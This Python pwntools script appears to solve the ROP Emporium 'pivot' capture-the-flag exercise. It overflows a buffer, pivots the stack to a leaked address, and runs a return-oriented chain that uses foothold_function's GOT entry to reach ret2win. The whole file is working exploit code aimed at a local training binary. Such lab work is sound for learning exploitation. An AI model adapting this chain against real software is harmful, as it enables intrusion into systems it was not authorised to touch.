import pwn

BUFFER = "A"*(40)
pop_rax = 0x00400b00
xchg_rax_rsp = 0x00400b02
data_loc = 0x00601050
system_addr = 0x00400810
mov_rax_deref_rax = 0x00400b05
add_rax_rbp = 0x00400b09
pop_rbp = 0x0000000000400900
call_rax = 0x000000000040098e


def write_to_stack_ptr(addr):
    rop = ""

    rop += pwn.p64(pop_rax)
    rop += pwn.p64(addr)
    rop += pwn.p64(xchg_rax_rsp)
    return rop


def call_foothold_function(foothold_addr):
    rop = ""
    rop += pwn.p64(pop_rax)
    rop += pwn.p64(0)
    rop += pwn.p64(foothold_addr)

    return rop


def call_offset_of_foothold(foot_got, offset):
    rop = ""

    rop += pwn.p64(pop_rax)
    rop += pwn.p64(foot_got)
    # this extracts the external address of from the got, it gets the
    # external address of foothold_function.
    rop += pwn.p64(mov_rax_deref_rax)
    # keep the offset in rbp
    rop += pwn.p64(pop_rbp)
    rop += pwn.p64(offset)
    # add the offset to rax. now instead of hodling foothold_function's
    #        address, rax holds ret2win's.
    rop += pwn.p64(add_rax_rbp)

    rop += pwn.p64(call_rax)

    return rop


piv = pwn.ELF("./pivot")

# rabin2 -s libpivot.so | grep foothold
foothold_addr = 0x00000970
# rabin2 -s libpivot.so | grep ret2win
ret2win_addr = 0x00000abe
offset = ret2win_addr-foothold_addr

payload = (
        # We call foothold function in order to reslove
        # the external function
        call_foothold_function(piv.symbols["foothold_function"]) +
        call_offset_of_foothold(piv.symbols["got.foothold_function"],
                                offset))

pwn.context.terminal = ['st', '-e', 'sh', '-c']
DEBUG = False

if DEBUG:
    proc = pwn.gdb.debug('./pivot', """
    b * 0x00400adf
    b * 0x00400ae2
    continue
    """)
else:
    proc = pwn.process("./pivot")

firt_out = proc.recvuntil(">")
pivot_place = firt_out.split(': ')[1]
pivot_place = int(pivot_place.split('\n')[0], 16)
proc.sendline(payload)
proc.recvuntil(">")
stack_smash_payload = BUFFER + write_to_stack_ptr(pivot_place)
proc.sendline(stack_smash_payload)
proc.recvuntil('.so')
print(proc.recvall())
